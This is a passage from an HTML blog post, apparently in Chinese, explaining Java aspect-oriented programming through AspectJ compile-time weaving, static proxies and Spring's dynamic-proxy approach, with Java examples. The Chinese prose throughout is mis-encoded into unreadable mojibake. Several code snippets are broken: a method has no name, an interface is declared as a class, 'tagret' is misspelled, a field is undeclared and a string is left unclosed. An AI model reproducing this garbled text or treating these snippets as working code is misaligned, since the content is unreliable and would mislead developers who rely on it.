å¯ä»¥åƒè€ƒã€‚</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/0__RMHhvccYDP2ziXr3.jpg\" alt=\"\"></p>\n<p>è®“æˆ‘å€‘ç”¨ç¨‹å¼ç¢¼çœ‹çœ‹ AspectJ å…·é«”çš„è¡Œç‚ºã€‚è€ƒæ…®ä»¥ä¸‹çš„ dummy å‡½å¼ï¼Œæˆ‘å€‘å®šç¾©äº†ä¸€å€‹ Authorize Aspect ï¼Œå¸Œæœ›åœ¨åŸ·è¡Œ dummy å‡½å¼ä¹‹å‰ä»¥åŠä¹‹å¾Œï¼Œéƒ½èƒ½å¤ åŸ·è¡Œ Authorize ç›¸é—œçš„é‚è¼¯ï¼Œå› æ­¤è²æ˜äº† before å’Œ after çš„åˆ‡å…¥é»ã€‚</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Authorize</span><br><span class=\"token keyword\">public</span> <span class=\"token class-name\">User</span> <span class=\"token function\">createNewUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> id<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> email<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InValidEmailException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"some task\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Aspect</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AuthorizeAspect</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token annotation punctuation\">@Pointcut</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execution(@com.example.annotation.Authorize  * *..*.*(..))\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">pointCut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token annotation punctuation\">@Before</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pointCut()\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JoinPoint</span> joinPoint<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UnAuthorizeException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dummy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token annotation punctuation\">@After</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pointCut()\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JoinPoint</span> joinPoint<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UnAuthorizeException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dummy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>ç‚ºäº†æ›´å¥½åœ°ç­è§£ Compiler-Time AOPçš„è¡Œç‚ºï¼Œæˆ‘ç”¨ AspectJ çš„ AJC Compiler (é€™é‚Šç”¨çš„æ˜¯ Compile time weaving ) ç¹”å…¥åˆ‡é¢ï¼Œç·¨è­¯å®Œ classfile ä¹‹å¾Œå†ç”¨ <a href=\"https://docs.oracle.com/javase/7/docs/technotes/tools/windows/javap.html\">javap</a> åç·¨è­¯å›æºç¢¼ä¹‹å¾Œå¦‚ä¸‹ã€‚<br>\nå¯ä»¥çœ‹åˆ° ajc å¯¦ä½œ AOP çš„æ–¹å¼å°±æ˜¯å…ˆå¹«æ¨™è¨˜çš„ Aspect é¡åˆ¥å»ºç«‹ aspectOf() å‡½å¼å–å¾— Aspect é¡åˆ¥çš„ Singleton ï¼Œ</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">AuthorizeAspect</span> <span class=\"token function\">aspectOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ajc$perSingletonInstance <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NoAspectBoundException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.example.application.aspect.AuthorizeAspect\"</span><span class=\"token punctuation\">,</span> ajc$initFailureCause<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">return</span> ajc$perSingletonInstance<span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>æ¥è‘—åœ¨æ¨™æ³¨å°æ‡‰ annotation çš„å‡½å¼ä¸­ç¬¦åˆåˆ‡é¢æ¢ä»¶çš„ä½ç½®ä¹‹å‰æˆ–ä¹‹å¾Œæ’å…¥è·³è½‰é»ä¸¦å‚³å…¥ç¹”å…¥é»çš„ç›¸é—œè¨Šæ¯(é¡åã€æ–¹æ³•åã€åƒæ•¸ç­‰ï¼‰</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Authorize</span><br><span class=\"token keyword\">public</span> <span class=\"token class-name\">User</span> <span class=\"token function\">createNewUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> id<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> email<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InValidEmailException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// ç”¨ Java reflectionæ©Ÿåˆ¶ç²å¾— JoinPoint çš„ Package, class, method name ç­‰è¨Šæ¯ï¼Œå‰µé€  JointPointå¯¦ä¾‹</span><br>    <span class=\"token class-name\">JoinPoint</span> var3 <span class=\"token operator\">=</span> <span class=\"token class-name\">Factory</span><span class=\"token punctuation\">.</span><span class=\"token function\">makeJP</span><span class=\"token punctuation\">(</span>ajc$tjp_1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">,</span> email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">User</span> var7<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token comment\">// åŸ·è¡Œ Authorize çš„ before aspectï¼Œä¸¦å‚³å…¥ JointPoint æä¾›æ­¤å‡½æ•¸çš„è³‡è¨Šèˆ‡åƒæ•¸</span><br>        <span class=\"token class-name\">AuthorizeAspect</span><span class=\"token punctuation\">.</span><span class=\"token function\">aspectOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">before</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"some task\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        var7 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> var8<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token comment\">// è‹¥å‡ºç¾ç•°å¸¸ ä¾ç„¶åŸ·è¡Œ after aspectä¸¦æ‹‹å‡ºç•°å¸¸</span><br>        <span class=\"token class-name\">AuthorizeAspect</span><span class=\"token punctuation\">.</span><span class=\"token function\">aspectOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">after</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">throw</span> var8<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token comment\">// åŸ·è¡Œ Authorize çš„ after aspect</span><br>    <span class=\"token class-name\">AuthorizeAspect</span><span class=\"token punctuation\">.</span><span class=\"token function\">aspectOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">after</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">return</span> var7<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å¾ä»¥ä¸Šç¯„ä¾‹æ‡‰è©²ä¸é›£çœ‹å‡º Compile-Time AOP çš„æ ¸å¿ƒé‹ä½œé‚è¼¯ï¼Œä¹Ÿå°±æ˜¯åœ¨ classfile ä¸­æ ¹æ“šæŸäº› meta information (e.g. annotation) ç”Ÿæˆå°æ‡‰çš„ aspect å‡½å¼ï¼Œä¸¦ä¸”åœ¨åˆæ ¼çš„åˆ‡å…¥é»è™•æ’å…¥è·³è½‰é»çš„å‡½å¼ã€‚</p>\n<p>åŸºæœ¬ä¸Š Compile-Time AOP æœ€æ˜é¡¯çš„å¥½è™•å°±æ˜¯åœ¨æ–¼å»¶é²ä½ï¼ŒåŸ·è¡ŒæœŸä¸éœ€è¦çŸ¥é“ä»»ä½• meta informationï¼Œä¹Ÿä¸éœ€è¦ç”¨åˆ° <a href=\"https://www.oracle.com/technical-resources/articles/java/javareflection.html\">reflection</a> æ©Ÿåˆ¶ï¼Œè¢«ç¹”å…¥çš„ code çœ‹èµ·ä¾†å°±åƒæ˜¯åŸç”Ÿçš„ code ä¸€æ¨£ï¼Œåªæ˜¯å¹«ä½ çœæ‰äº†è‡ªå·±é‡è¤‡æ’°å¯«çš„éº»ç…©ã€‚</p>\n<h4 id=\"run-time-aop-%E2%80%94-spring-aop-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5\"><a class=\"direct-link\" href=\"#run-time-aop-%E2%80%94-spring-aop-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5\">#</a> Run-Time AOPâ€Šâ€”â€ŠSpring AOPÂ ä¸­çš„ç­–ç•¥</h4>\n<p>ç›¸è¼ƒæ–¼ Compile-Time AOP ä¸­ä¸»è¦æ˜¯è—‰ç”±ã€Œç¹”å…¥ã€ä¾†å®Œæˆ AOPï¼Œ Run-Time AOP å¸Œæœ›èƒ½è®“ä¸€åˆ‡çš„ç›¸é—œæ“ä½œéƒ½ç™¼ç”Ÿåœ¨åŸ·è¡ŒæœŸ (å°±åƒå‹•æ…‹èªè¨€ä¸­çš„ AOP å¯¦ç¾é‚£æ¨£)ã€‚ç›®å‰æœ€ä¸»æµçš„åšæ³•æ˜¯æ‰€è¬‚çš„ â€œProxy-based AOPâ€ ï¼Œä»¥ Java ç‚ºä¾‹ï¼Œä¾¿æ˜¯é‹ç”¨ reflection API ä¸­çš„ Proxy å‡½å¼åº«ã€‚ å†å…·é«”åœ°ç´°åˆ†ï¼Œé‚„å¯ä»¥åˆ†æˆéœæ…‹ä»£ç†èˆ‡å‹•æ…‹ä»£ç†å…©ç¨®æ¨¡å¼ã€‚</p>\n<ul>\n<li>éœæ…‹ä»£ç† ( Static-Proxy)<br>\nä¸€å¥è©±æ¦‚æ‹¬èªªæ˜éœæ…‹ä»£ç†å°±æ˜¯ï¼šç”¨ä¸€å€‹ Aspect Proxy å¯¦ç¾ â€œ Decorator Pattern â€ ã€‚æ‰€æœ‰éœ€è¦è¢« Aspect åˆ‡å…¥çš„å‡½å¼éƒ½å¿…é ˆä»¥ä»‹é¢çš„å½¢å¼å®šç¾©ã€‚ AspectProxy é¡åˆ¥å‰‡ä¹Ÿéœ€è¦å¯¦ä½œæ­¤ä»‹é¢ï¼ŒæŠŠè¦è¢«åˆ‡å…¥çš„ä»‹é¢çš„å¯¦ä¾‹ä¿å­˜èµ·ä¾†( target )ã€‚åœ¨å‘¼å« target çš„ä»‹é¢æ–¹æ³•æ™‚ï¼Œ è®“ proxy å…ˆ(æˆ–ä¹‹å¾Œ)å»åŸ·è¡Œåˆ‡é¢æ–¹æ³•ã€‚</li>\n</ul>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>proxy</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IFetchData</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>proxy</span><span class=\"token punctuation\">;</span><br><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FetchData</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IFetchData</span><span class=\"token punctuation\">{</span><br>    <span class=\"token annotation punctuation\">@Override</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å–å¾—è³‡æ–™\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>proxy</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AuthorizeProxy</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IFetchData</span><span class=\"token punctuation\">{</span><br>  <br>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">IFetchData</span> target<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">AuthorizeProxy</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IFetchData</span> target<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>target <span class=\"token operator\">=</span> target<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <br>    <span class=\"token annotation punctuation\">@Override</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"åŸ·è¡Œbefore Aspect\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        target<span class=\"token punctuation\">.</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"åŸ·è¡Œafter Aspect\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>ç›¸ä¿¡å¤§å®¶æ‡‰è©²ä¸é›£çœ‹å‡ºä¾†ï¼Œç”¨éœæ…‹ä»£ç†å¯¦ç¾ AOP éå¸¸ä¹‹éº»ç…©ï¼Œæœ‰ä»»ä½•å¯èƒ½æœƒéœ€è¦è¢«ä»£ç†çš„åœ°æ–¹éƒ½å¿…é ˆå®£å‘Šæˆä»‹é¢ï¼ŒåŒæ™‚ Aspect Proxy ä¹Ÿå¿…é ˆé‡å°æ‰€æœ‰å¯èƒ½éœ€è¦è¢«ä»£ç†çš„ä»‹é¢éƒ½æ’°å¯«é‡è¤‡çš„åˆ‡é¢é‚è¼¯ã€‚åœ¨å¯¦å‹™ä¸Šé€™éº¼åšå…¶å¯¦ä¸å¤ªå¯¦éš›ã€‚</p>\n<ul>\n<li>å‹•æ…‹ä»£ç† ( Dynamic Proxy )<br>\nå¦ä¸€ç¨® Run-Time AOP ï¼ŒåŒæ™‚ä¹Ÿæ˜¯ åŒ…å« Spring AOP ç­‰å¥—ä»¶æ‰€ä½¿ç”¨çš„ä¸»æµæ–¹å¼æ˜¯å‹•æ…‹ä»£ç†ã€‚é€™ç¨®ä½œæ³•çš„åŸºç¤æ˜¯ä¾†è‡ªæ–¼ Java åŸç”ŸåŒ…å«çš„ reflection APIã€‚ reflection API æ˜¯ä¸€å¥—å¯ä»¥å‘ JVM è©¢å•ã€ä¿®æ”¹ class å’Œå…¶æ–¹æ³•èˆ‡å±¬æ€§çš„æ©Ÿåˆ¶ã€‚<br>\nè‡³æ–¼ç‚ºä»€éº¼ç”¨ reflection æˆ‘å€‘å°±å¯ä»¥å¯¦ç¾ AOPï¼Œå…ˆè®“æˆ‘å€‘åƒè€ƒä»¥ä¸‹é€™å€‹ç¯„ä¾‹ï¼š</li>\n</ul>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>dynamicproxy</span><br><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span><span class=\"token punctuation\">;</span> <br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AuthorizeProxy</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">InvocationHandler</span> <span class=\"token punctuation\">{</span> <br>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Object</span> delegate<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">AuthorizeService</span> authorizeService<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> target<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <br>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>target <span class=\"token operator\">=</span> target<span class=\"token punctuation\">;</span> <br>        <span class=\"token comment\">// å‘ reflection.Proxy è¨»å†Š target çš„é¡åˆ¥ä¸¦æä¾› Handlerï¼ˆæ­¤ä¾‹ä¸­ç‚ºthis)ï¼Œä¸¦å›å‚³ proxy å¯¦ä¾‹ï¼Œ </span><br>        <span class=\"token comment\">// proxy è—‰ç”± reflection APIï¼Œå¯ä»¥æ§‹é€ å‡ºä¸€å€‹è·Ÿ target å…·æœ‰ä¸€æ¨£ method å’Œ field çš„å…¨æ–°é¡åˆ¥</span><br>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span> <br>                           target<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <br>                           target<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInterfaces</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <br>                           <span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>    <span class=\"token punctuation\">}</span> <br>    <span class=\"token annotation punctuation\">@Override</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> proxy<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Method</span> method<span class=\"token punctuation\">,</span> <br>                         <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UnAuthorizedException</span> <span class=\"token punctuation\">{</span> <br>        <span class=\"token comment\">// Aspect çœŸæ­£çš„é‚è¼¯å°±åœ¨é€™é‚ŠåŸ·è¡Œ</span><br>        <span class=\"token class-name\"><span class=\"token namespace\">authorizeService<span class=\"token punctuation\">.</span></span>Authorize</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        result <span class=\"token operator\">=</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>tagret<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>\"å¦‚æœè¦åšä»€éº¼ clean up å¯ä»¥åœ¨é€™é‚Šåš<span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span> <br>    <span class=\"token punctuation\">}</span> <br> <br><span class=\"token punctuation\">}</span></code></pre>\n<p>æˆ‘å€‘å¯ä»¥è—‰ç”±ä¸€å€‹ bind å‡½å¼ï¼Œå‘ reflection.Proxy è¨»å†Š target çš„é¡åˆ¥ä¸¦æä¾› Handlerï¼ˆæ­¤ä¾‹ä¸­ç‚ºthis)ï¼Œä¸¦å›å‚³ proxy å¯¦ä¾‹ã€‚</p>\n<p>Proxy è—‰ç”± reflection APIï¼Œå¯ä»¥å»ºæ§‹å‡ºä¸€å€‹è·Ÿ target å…·æœ‰ä¸€æ¨£ method å’Œ field çš„å…¨æ–°é¡åˆ¥ï¼Œä½†å› ç‚ºæˆ‘å€‘å¯¦ç¾äº† InovocationHandler ä»‹é¢ï¼Œå› æ­¤ proxy åœ¨å»ºæ§‹é€™å€‹å¹¾ä¹ä¸€æ¨£çš„é¡åˆ¥æ™‚ï¼Œæœƒåœ¨ target çš„æ–¹æ³•è¢«å‘¼å«æ™‚æ”¹æˆå‘¼å« invoke æ–¹æ³•[5]ï¼Œå› æ­¤å¦‚æœè¦å¯¦ç¾ AOP ï¼Œæˆ‘å€‘å°±åªè¦ä¿®æ”¹ invoke å‡½å¼åŠ ä¸Šéœ€è¦çš„ aspects å°±è¡Œäº†ã€‚</p>\n<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘å€‘ä½¿ç”¨äº†åŸºæ–¼ reflection API å‹•æ…‹å‰µé€ å‡ºä¾†çš„ class ï¼Œé™¤äº† æœƒæœ‰ JVM ä¸­ class loader çš„ overhead ä»¥å¤–ï¼Œé€™å€‹ class çš„ method è¢«å‘¼å«æ™‚éƒ½æœƒéœ€è¦é€šéè¨±å¤šé¡å¤–çš„æª¢æŸ¥ï¼Œè®“è¨±å¤š JVM çš„åŸ·è¡ŒæœŸå„ªåŒ–ç­–ç•¥å¤±æ•ˆ[6]ï¼Œæ‰€ä»¥æœ¬è³ªä¸Šé€™ç¨®ä½œæ³•åœ¨é€Ÿåº¦ä¸Šæœƒæœ‰æ˜é¡¯çš„åŠ£å‹¢ã€‚</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>dynamicproxy</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">DataFetcherDemo</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token class-name\">DemoFetchData</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">AuthorizeProxy</span> proxy  <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AuthorizeProxy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>        <br>        <span class=\"token class-name\">IFetchData</span> fetchData <span class=\"token operator\">=</span> <br>                <span class=\"token punctuation\">(</span><span class=\"token class-name\">IFetchData</span><span class=\"token punctuation\">)</span> proxy<span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FetchData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <br>        <span class=\"token keyword\">return</span> fetchData<span class=\"token punctuation\">.</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™ç¨®ã€Œå‹•æ…‹ä»£ç†ã€çš„æ–¹å¼æ­£æ˜¯ Spring æ¡†æ¶ä¸­çš„ Spring AOP æ‰€ä½¿ç”¨çš„ç­–ç•¥ã€‚æ ¹æ“š Spring AOP çš„<a href=\"https://docs.spring.io/spring-framework/docs/2.5.x/reference/aop.html\">å®˜æ–¹ document</a> ï¼Œåœ¨ä½¿ç”¨æ–¹é¢å¹¾ä¹æ˜¯è·Ÿ AspectJ å¤§åŒå°ç•°ï¼Œå»å¯ä»¥çœå»å»ºç½®å°ˆæ¡ˆæ™‚éœ€è¦é¡å¤–çš„æ’ä»¶ä¾†ç¹”å…¥ aspects çš„éº»ç…©ã€‚</p>\n<p>ä½†å› ç‚º Proxy çš„ç®¡ç†æ˜¯ç”± Spring å®¹å™¨ä¾†åŸ·è¡Œï¼Œæ‰€ä»¥é™åˆ¶è‡ªç„¶å°±æ˜¯åªæœ‰è¢« Spring ç®¡ç†çš„ beans å¯ä»¥è¢«ä»£ç†ã€‚</p>\n<p>åŸºæ–¼å‹•æ…‹ä»£ç†ä¾†åš AOP çš„è©±ï¼Œå‹™å¿…è¦ææ¸…æ¥š Proxy çš„è¡Œç‚ºã€‚åœ¨åŒä¸€å€‹é¡åˆ¥ä¸­å‘¼å«é¡åˆ¥å…§å…¶ä»–å‡½å¼çš„è©±ï¼Œæ˜¯æ²’æœ‰è¾¦æ³•è¢« Proxy æ””æˆªçš„ã€‚è€ƒæ…®ä¸€å€‹æˆ‘å€‘å°‡ FooBoo é¡åˆ¥ç”¨ FooBooProxy é€²è¡Œä»£ç†ä¸¦å‘¼å«å…¶ä¸­çš„ boo å‡½å¼çš„ç‹€æ³ï¼š</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/1__LCqsIhQ__1KGPazjA85zDZQ.png\" alt=\"\"></p>\n<p>å¦å¤–å€¼å¾—ä¸€æçš„ä¸€é»æ˜¯ï¼Œ Java ä¸­å¯¦ç¾å‹•æ…‹ä»£ç†é™¤äº†ä½¿ç”¨åŸç”Ÿçš„ Proxy ä»¥å¤–ï¼Œäº¦å¯ä»¥ä½¿ç”¨å¦‚ <a href=\"https://github.com/cglib/cglib\">cglib</a> ç­‰ bytecode generation å‡½å¼åº«ï¼Œå¯ä»¥åšåˆ°è®“ Proxy 